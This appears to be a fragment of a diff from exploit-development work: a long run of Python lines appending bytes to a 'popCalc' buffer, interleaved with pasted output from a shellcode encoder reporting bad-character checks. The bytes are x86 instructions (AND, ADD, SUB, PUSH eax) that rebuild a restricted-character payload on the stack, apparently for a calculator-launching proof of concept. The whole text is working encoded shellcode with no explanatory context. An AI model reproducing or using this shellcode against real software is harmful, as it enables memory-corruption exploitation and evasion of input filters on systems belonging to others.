+popCalc += "\x05\x33\x21\x37\x36" ## add  eax, 0x36372133
+popCalc += "\x05\x33\x10\x37\x35" ## add  eax, 0x35371033
+popCalc += "\x50"                 ## push eax
+[*] Encoding [715a6156]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x31\x35\x31" ## add  eax, 0x31353133
+popCalc += "\x05\x23\x30\x25\x40" ## add  eax, 0x40253023
+popCalc += "\x50"                 ## push eax
+[*] Encoding [48306368]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x32\x20\x24" ## add  eax, 0x24203234
+popCalc += "\x05\x34\x31\x10\x24" ## add  eax, 0x24103134
+popCalc += "\x50"                 ## push eax
+[*] Encoding [58625174]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x31\x31\x34" ## add  eax, 0x34313132
+popCalc += "\x05\x42\x20\x31\x24" ## add  eax, 0x24312042
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6c426b6e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x21\x36" ## add  eax, 0x36213637
+popCalc += "\x05\x37\x35\x21\x36" ## add  eax, 0x36213537
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c676a32]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x35\x33\x26" ## add  eax, 0x26333521
+popCalc += "\x05\x11\x35\x34\x26" ## add  eax, 0x26343511
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6b4e5074]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x30\x27\x36" ## add  eax, 0x36273032
+popCalc += "\x05\x42\x20\x27\x35" ## add  eax, 0x35272042
+popCalc += "\x50"                 ## push eax
+[*] Encoding [52304b4c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x26\x26\x20\x31" ## add  eax, 0x31202626
+popCalc += "\x05\x26\x25\x10\x21" ## add  eax, 0x21102526
+popCalc += "\x50"                 ## push eax
+[*] Encoding [77623276]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x21\x31\x33" ## add  eax, 0x33312133
+popCalc += "\x05\x43\x11\x31\x44" ## add  eax, 0x44311143
+popCalc += "\x50"                 ## push eax
+[*] Encoding [72387279]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x31\x24\x31" ## add  eax, 0x31243135
+popCalc += "\x05\x44\x41\x14\x41" ## add  eax, 0x41144144
+popCalc += "\x50"                 ## push eax
+[*] Encoding [675a7177]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x31\x35\x33" ## add  eax, 0x33353133
+popCalc += "\x05\x44\x40\x25\x34" ## add  eax, 0x34254044
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6d464f48]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x37\x33\x36" ## add  eax, 0x36333734
+popCalc += "\x05\x24\x26\x23\x36" ## add  eax, 0x36232624
+popCalc += "\x05\x23\x25\x23\x34" ## add  eax, 0x34232523
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [714b5047]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x23\x30\x26\x31" ## add  eax, 0x31263023
+popCalc += "\x05\x24\x20\x25\x40" ## add  eax, 0x40252024
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c764264]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x21\x33\x26" ## add  eax, 0x26332132
+popCalc += "\x05\x32\x21\x43\x26" ## add  eax, 0x26432132
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6c613155]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x21\x31\x36" ## add  eax, 0x36312133
+popCalc += "\x05\x22\x10\x30\x36" ## add  eax, 0x36301022
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c774c6e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x26\x33\x26" ## add  eax, 0x26332637
+popCalc += "\x05\x37\x26\x44\x26" ## add  eax, 0x26442637
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6f793170]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x41\x21\x44\x37" ## add  eax, 0x37442141
+popCalc += "\x05\x31\x22\x34\x36" ## add  eax, 0x36342231
+popCalc += "\x05\x31\x21\x34\x35" ## add  eax, 0x35342131
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [76357a63]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x35\x23\x33" ## add  eax, 0x33233532
+popCalc += "\x05\x31\x45\x12\x43" ## add  eax, 0x43124531
+popCalc += "\x50"                 ## push eax
+[*] Encoding [674d4f64]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x37\x36\x34" ## add  eax, 0x34363733
+popCalc += "\x05\x32\x26\x26\x33" ## add  eax, 0x33262632
+popCalc += "\x05\x32\x25\x24\x33" ## add  eax, 0x33242532
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [58673264]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x21\x33\x34" ## add  eax, 0x34332132
+popCalc += "\x05\x32\x11\x34\x24" ## add  eax, 0x24341132
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4b6c3442]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x22\x36\x26" ## add  eax, 0x26362221
+popCalc += "\x05\x21\x12\x36\x25" ## add  eax, 0x25361221
+popCalc += "\x50"                 ## push eax
+[*] Encoding [42516b4e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x36\x31\x21" ## add  eax, 0x21313627
+popCalc += "\x05\x27\x35\x20\x21" ## add  eax, 0x21203527
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c545250]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x30\x31\x32\x26" ## add  eax, 0x26323130
+popCalc += "\x05\x20\x21\x22\x26" ## add  eax, 0x26222120
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4b6c3030]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x20\x20\x36\x26" ## add  eax, 0x26362020
+popCalc += "\x05\x10\x10\x36\x25" ## add  eax, 0x25361010
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30466b4e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x36\x23\x20" ## add  eax, 0x20233627
+popCalc += "\x05\x27\x35\x23\x10" ## add  eax, 0x10233527
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6470304f]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x21\x41\x33" ## add  eax, 0x33412137
+popCalc += "\x05\x26\x21\x31\x32" ## add  eax, 0x32312126
+popCalc += "\x05\x25\x21\x31\x32" ## add  eax, 0x32312125
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [61356558]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x33\x23\x31" ## add  eax, 0x31233334
+popCalc += "\x05\x24\x32\x12\x30" ## add  eax, 0x30123224
+popCalc += "\x50"                 ## push eax
+[*] Encoding [696e3065]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x20\x37\x35" ## add  eax, 0x35372033
+popCalc += "\x05\x32\x10\x37\x34" ## add  eax, 0x34371032
+popCalc += "\x50"                 ## push eax
+[*] Encoding [70777047]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x23\x30\x33\x30" ## add  eax, 0x30333023
+popCalc += "\x05\x24\x40\x44\x40" ## add  eax, 0x40444024
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7037426c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x21\x23\x30" ## add  eax, 0x30232136
+popCalc += "\x05\x36\x21\x14\x40" ## add  eax, 0x40142136
+popCalc += "\x50"                 ## push eax
+[*] Encoding [78396c69]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x36\x25\x34" ## add  eax, 0x34253635
+popCalc += "\x05\x34\x36\x14\x44" ## add  eax, 0x44143634
+popCalc += "\x50"                 ## push eax
+[*] Encoding [494a7542]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x33\x25\x25" ## add  eax, 0x25253321
+popCalc += "\x05\x21\x42\x25\x24" ## add  eax, 0x24254221
+popCalc += "\x50"                 ## push eax
+[*] Encoding [41385058]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x30\x24\x21" ## add  eax, 0x21243034
+popCalc += "\x05\x24\x20\x14\x20" ## add  eax, 0x20142024
+popCalc += "\x50"                 ## push eax
+[*] Encoding [42414242]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x21\x21\x21" ## add  eax, 0x21212121
+popCalc += "\x05\x21\x21\x20\x21" ## add  eax, 0x21202121
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30424232]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x21\x21\x20" ## add  eax, 0x20212121
+popCalc += "\x05\x11\x21\x21\x10" ## add  eax, 0x10212111
+popCalc += "\x50"                 ## push eax
+[*] Encoding [42413251]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x21\x21\x21" ## add  eax, 0x21212131
+popCalc += "\x05\x20\x11\x20\x21" ## add  eax, 0x21201120
+popCalc += "\x50"                 ## push eax
+[*] Encoding [41416b41]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x36\x21\x21" ## add  eax, 0x21213621
+popCalc += "\x05\x20\x35\x20\x20" ## add  eax, 0x20203520
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30413050]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x30\x20\x21\x20" ## add  eax, 0x20212030
+popCalc += "\x05\x20\x10\x20\x10" ## add  eax, 0x10201020
+popCalc += "\x50"                 ## push eax
+[*] Encoding [58416a5a]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x35\x21\x34" ## add  eax, 0x34213535
+popCalc += "\x05\x25\x35\x20\x24" ## add  eax, 0x24203525
+popCalc += "\x50"                 ## push eax
+[*] Encoding [51374343]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x22\x22\x23\x31" ## add  eax, 0x31232222
+popCalc += "\x05\x21\x21\x14\x20" ## add  eax, 0x20142121
+popCalc += "\x50"                 ## push eax
+[*] Encoding [43434343]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x22\x22\x22\x22" ## add  eax, 0x22222222
+popCalc += "\x05\x21\x21\x21\x21" ## add  eax, 0x21212121
+popCalc += "\x50"                 ## push eax
+[*] Encoding [49494949]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x25\x25\x25\x25" ## add  eax, 0x25252525
+popCalc += "\x05\x24\x24\x24\x24" ## add  eax, 0x24242424
+popCalc += "\x50"                 ## push eax
+[*] Encoding [49494949]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x25\x25\x25\x25" ## add  eax, 0x25252525
+popCalc += "\x05\x24\x24\x24\x24" ## add  eax, 0x24242424
+popCalc += "\x50"                 ## push eax
+[*] Encoding [49495956]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x35\x25\x25" ## add  eax, 0x25253533
+popCalc += "\x05\x23\x24\x24\x24" ## add  eax, 0x24242423
+popCalc += "\x50"                 ## push eax
+[*] Encoding [5ef473d9]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x64\x42\x73\x36" ## add  eax, 0x36734264
+popCalc += "\x05\x64\x32\x62\x35" ## add  eax, 0x35623264
+popCalc += "\x05\x44\x32\x52\x26" ## add  eax, 0x26523244
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [d0d9e389]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x45\x72\x75\x70" ## add  eax, 0x70757245
+popCalc += "\x05\x44\x71\x64\x60" ## add  eax, 0x60647144
+popCalc += "\x50"                 ## push eax
+
